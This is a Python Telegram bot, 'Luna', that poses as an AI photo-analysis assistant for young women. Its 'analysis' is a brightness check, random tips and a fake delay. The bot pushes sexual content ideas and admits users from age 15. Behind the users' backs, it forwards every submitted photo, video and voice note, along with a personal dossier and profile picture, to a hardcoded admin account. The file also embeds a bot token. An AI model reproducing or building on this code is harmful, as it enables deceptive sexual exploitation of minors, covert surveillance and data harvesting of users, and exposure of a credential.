import os
import io
import random
import threading
import asyncio
from datetime import datetime
from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from agewizard import Age
from PIL import Image, ImageStat

# --- CONFIGURACIÓN ---
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
DANI_CHAT_ID = 8099004064 

# --- SERVIDOR WEB ---
web_app = Flask(__name__)

@web_app.route('/')
def home(): return "Luna Bot en línea 24/7"

@web_app.route('/health')
def health(): return "OK"

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    web_app.run(host="0.0.0.0", port=port)

# --- BASES DE DATOS ---
verified_users = {}
niveles = {}
puntos = {}
perfiles = {} 
ultima_actividad = {}
estilos_asignados = {}
bot_pausado = False

# --- RESPUESTAS Y CONSEJOS ---
MENSAJES_PROCESANDO = [
    "🔍 **Encendiendo visión artificial...**\nAnalizando cada píxel de tu foto. Dame unos segundos.",
    "🧠 **Procesando imagen...**\nMi IA está revisando la luz, el encuadre y tu expresión. Un momento.",
    "✨ **Analizando composición...**\nEstoy buscando la mejor manera de resaltar tu belleza. Espera un segundo.",
    "📸 **Revisando detalles...**\nDame un momento, estoy calculando la mejor iluminación para ti."
]

CONSEJOS_LUZ = [
    "💡 La luz lateral es tu mejor amiga, marca los músculos y las curvas.",
    "💡 Si la luz es muy dura, pon una sábana blanca entre la lámpara y tú.",
    "💡 La luz de la ventana por la mañana es la más favorecedora.",
    "💡 Evita la luz directa del techo, aplana mucho el cuerpo.",
    "💡 Usa luces de colores (rojo o morado) para un ambiente más íntimo."
]

CONSEJOS_POSE = [
    "💃 Arquear un poco la espalda resalta tus curvas.",
    "💃 Relaja los hombros y baja la barbilla, da un aire de misterio.",
    "💃 Separa los brazos de la cintura para estilizar tu silueta.",
    "💃 Usa tus manos para jugar con tu cabello, da movimiento.",
    "💃 Si estás en la cama, deshaz las sábanas, se ve más natural.",
    "💃 Cruza un poco las piernas, estiliza y da un toque elegante.",
    "💃 Mira por encima del hombro, es un ángulo muy sensual.",
    "💃 Apóyate en una pared, proyecta seguridad y poder."
]

CONSEJOS_FETICHES = [
    "🔞 Prueba con un poco de lencería de encaje, el contraste con la piel es muy popular.",
    "🔞 El uso de aceites corporales le da un brillo a la piel que llama mucho la atención.",
    "🔞 Juega con el misterio, dejar poco a la imaginación es más exitoso.",
    "🔞 Usa un espejo para mostrar ángulos que la cámara directa no puede captar.",
    "🔞 Los tacones altos estilizan la figura y son un clásico."
]

IDEAS_CONTENIDO = [
    "📸 Graba un video corto quitándote una prenda lentamente.",
    "📸 Haz una sesión con lencería de encaje y luz cálida.",
    "📸 Usa un espejo para mostrar un ángulo diferente de tu cuerpo.",
    "📸 Prueba un baño de espuma con pétalos de rosa.",
    "📸 Haz una sesión temática (enfermera, policía, profesora)."
]

def analizar_foto_avanzado(imagen_bytes):
    img = Image.open(io.BytesIO(imagen_bytes)).convert("L")
    stat = ImageStat.Stat(img)
    brillo = stat.mean[0]
    
    resultado = []
    if brillo < 40: resultado.append("🔦 **Nota técnica:** La foto está muy oscura.")
    elif brillo > 210: resultado.append("☀️ **Nota técnica:** Demasiada luz, quema los detalles.")
    else: resultado.append("✨ **Nota técnica:** Iluminación perfecta.")
    
    resultado.append(random.choice(CONSEJOS_LUZ))
    resultado.append(random.choice(CONSEJOS_POSE))
    if random.random() < 0.3: resultado.append(random.choice(CONSEJOS_FETICHES))
    return "\n\n".join(resultado)

async def enviar_expediente_inicial(context, user, edad, estilo):
    try:
        nombre = user.first_name
        apellido = user.last_name if user.last_name else "No tiene"
        username = f"@{user.username}" if user.username else "Oculto"
        user_id = user.id
        idioma = user.language_code if user.language_code else "Desconocido"
        es_premium = "Sí ⭐" if user.is_premium else "No"
        
        hora_actual = datetime.now().hour
        if 0 <= hora_actual < 6: habito = "🌙 Trasnochadora"
        elif 6 <= hora_actual < 12: habito = "☀️ Madrugadora"
        elif 12 <= hora_actual < 19: habito = "🌤 Tarde"
        else: habito = "🌙 Noche"

        fotos = await context.bot.get_user_profile_photos(user_id, limit=1)
        tiene_foto = "Sí (Adjunta)" if fotos.total_count > 0 else "Privada / No tiene"

        reporte = (
            f"🕵️‍♂️ **EXPEDIENTE (Luna)**\n"
            f"👤 **Nombre:** {nombre} {apellido}\n"
            f"🔗 **Usuario:** {username}\n"
            f"🆔 **ID:** `{user_id}`\n"
            f"🌍 **Idioma:** {idioma}\n"
            f"⭐ **Premium:** {es_premium}\n"
            f"🖼 **Foto Perfil:** {tiene_foto}\n"
            f"⏰ **Hábito:** {habito}\n"
            f"🎂 **Edad:** {edad} años\n"
            f"🧠 **Estilo:** {estilo}\n"
        )
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
        if fotos.total_count > 0:
            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=fotos.photos[0][-1].file_id)
    except Exception as e: print(f"Error: {e}")

async def aviso_corto(context, user, tipo):
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(chat_id=DANI_CHAT_ID, text=f"📥 **{tipo}** de: {username} (ID: `{user.id}`)")

# --- 1. START Y REGISTRO (CON EXPLICACIÓN) ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return await update.message.reply_text("Luna está descansando. Vuelve más tarde. 🌙")
    user_id = update.effective_user.id
    
    if user_id not in verified_users:
        mensaje_bienvenida = (
            "¡Hola! 🌙 Soy **Luna**, tu asistente de imagen con visión artificial.\n\n"
            "**¿Qué puedo hacer por ti?**\n"
            "📸 Analizar tus fotos y videos para darte consejos de luz, pose y composición.\n"
            "💡 Darte ideas de contenido si no sabes qué publicar.\n"
            "🏆 Hacerte subir de nivel mientras mejoras tu contenido.\n\n"
            "Para empezar y verificar que eres mayor de edad, envíame tu fecha de nacimiento (DD-MM-AAAA):"
        )
        await update.message.reply_text(mensaje_bienvenida)
    else:
        await update.message.reply_text("¡Hola de nuevo! 🌙 Envíame una foto o video y lo analizaremos.")

async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    text = update.message.text.strip()
    user = update.effective_user
    
    if user.id in verified_users:
        return await update.message.reply_text("Ya estás verificada. Envíame una foto o video.")

    try:
        person = Age(text, date_format="DD-MM-YYYY")
        edad = person.years
        if 15 <= edad <= 80:
            verified_users[user.id] = True
            niveles[user.id] = 1
            puntos[user.id] = 0
            ultima_actividad[user.id] = datetime.now()
            
            if edad < 20: estilo = "Universitaria / Fresca"
            elif edad < 30: estilo = "Joven / Atrevida"
            elif edad < 45: estilo = "Experimentada / Segura"
            else: estilo = "Madura / Elegante"

            perfiles[user.id] = {"edad": edad, "estilo": estilo}
            estilos_asignados[user.id] = estilo
            
            await update.message.reply_text(f"✅ ¡Todo listo! Ya puedes enviarme fotos o videos.")
            await enviar_expediente_inicial(context, user, edad, estilo)
        else:
            await update.message.reply_text(f"❌ Lo siento, tienes {edad} años. Rango permitido: 15 a 80.")
    except ValueError:
        await update.message.reply_text("Formato incorrecto. Usa DD-MM-AAAA.")

# --- 2. COMANDOS DE LAS CHICAS ---
async def pedir_idea(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"💡 **Idea de Luna:**\n{random.choice(IDEAS_CONTENIDO)}")

async def ver_perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
    nivel = niveles.get(user_id, 1)
    pts = puntos.get(user_id, 0)
    nombre_nivel = {1: "Principiante 🌱", 2: "Intermedia 🌿", 3: "Avanzada 🌳"}.get(nivel, "Desconocido")
    await update.message.reply_text(f"👤 **Tu Perfil**\n\n🏆 Nivel: {nombre_nivel}\n⭐ Puntos: {pts}\n🧠 Estilo: {estilos_asignados.get(user_id, 'Desconocido')}")

# --- 3. COMANDOS DE ADMINISTRADOR ---
async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DANI_CHAT_ID: return
    await update.message.reply_text(f"📊 **PANEL**\n👥 Chicas: {len(verified_users)}\n⚙️ Estado: {'Pausado' if bot_pausado else 'Activo'}")

async def admin_pausar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bot_pausado
    if update.effective_user.id != DANI_CHAT_ID: return
    bot_pausado = not bot_pausado
    await update.message.reply_text(f"⚙️ Bot {'PAUSADO' if bot_pausado else 'REANUDADO'}.")

async def admin_lista(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DANI_CHAT_ID: return
    if not verified_users: return await update.message.reply_text("No hay chicas registradas.")
    texto = "👥 **Lista de Chicas:**\n"
    for uid in verified_users.keys():
        texto += f"- ID: {uid} | Nivel: {niveles.get(uid, 1)}\n"
    await update.message.reply_text(texto)

# --- 4. RECEPCIÓN DE MULTIMEDIA ---
async def analyze_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    user_id = update.effective_user.id
    user = update.effective_user
    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
    
    ultima_actividad[user_id] = datetime.now()
    msg_espera = await update.message.reply_text(random.choice(MENSAJES_PROCESANDO))
    
    photo_file = await update.message.photo[-1].get_file()
    photo_bytes = await photo_file.download_as_bytearray()
    
    await asyncio.sleep(4) 
    sugerencia = analizar_foto_avanzado(photo_bytes)
    
    puntos[user_id] = puntos.get(user_id, 0) + 10
    if puntos[user_id] >= 50 and niveles[user_id] == 1:
        niveles[user_id] = 2
        await update.message.reply_text("🎉 ¡Felicidades! Has subido a nivel Intermedia 🌿.")
    elif puntos[user_id] >= 150 and niveles[user_id] == 2:
        niveles[user_id] = 3
        await update.message.reply_text("🏆 ¡Increíble! Has subido a nivel Avanzada 🌳.")
    
    await msg_espera.edit_text(f"📸 **Análisis de Luna:**\n\n{sugerencia}")
    try: await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=photo_file.file_id)
    except: pass
    await aviso_corto(context, user, "Foto")

async def analyze_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    user_id = update.effective_user.id
    user = update.effective_user
    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
    
    ultima_actividad[user_id] = datetime.now()
    msg_espera = await update.message.reply_text("🎥 **Procesando archivo...**\nDame un momento.")
    
    tipo, envio = "Archivo", "document"
    if update.message.video: tipo, envio = "Video", "video"; f = await update.message.video.get_file()
    elif update.message.voice: tipo, envio = "Nota de voz", "voice"; f = await update.message.voice.get_file()
    elif update.message.animation: tipo, envio = "GIF", "document"; f = await update.message.animation.get_file()
    else: return await update.message.reply_text("Formato no soportado.")
    
    puntos[user_id] = puntos.get(user_id, 0) + 5
    await asyncio.sleep(2)
    await msg_espera.edit_text(f"✅ He recibido tu {tipo}. ¡Buen trabajo!")
    
    try:
        if envio == "video": await context.bot.send_video(chat_id=DANI_CHAT_ID, video=f.file_id)
        elif envio == "voice": await context.bot.send_voice(chat_id=DANI_CHAT_ID, voice=f.file_id)
        else: await context.bot.send_document(chat_id=DANI_CHAT_ID, document=f.file_id)
    except: pass
    await aviso_corto(context, user, tipo)

def main():
    threading.Thread(target=run_flask, daemon=True).start()
    
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("perfil", ver_perfil))
    app.add_handler(CommandHandler("idea", pedir_idea))
    app.add_handler(CommandHandler("stats", admin_stats))
    app.add_handler(CommandHandler("pausar", admin_pausar))
    app.add_handler(CommandHandler("lista", admin_lista))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age))
    app.add_handler(MessageHandler(filters.PHOTO, analyze_photo))
    app.add_handler(MessageHandler(filters.VIDEO | filters.ANIMATION | filters.VIDEO_NOTE | filters.VOICE | filters.AUDIO, analyze_media))
    
    print("Luna Nivel 100 en línea. Dani observa.")
    app.run_polling()

if __name__ == "__main__":
    main()
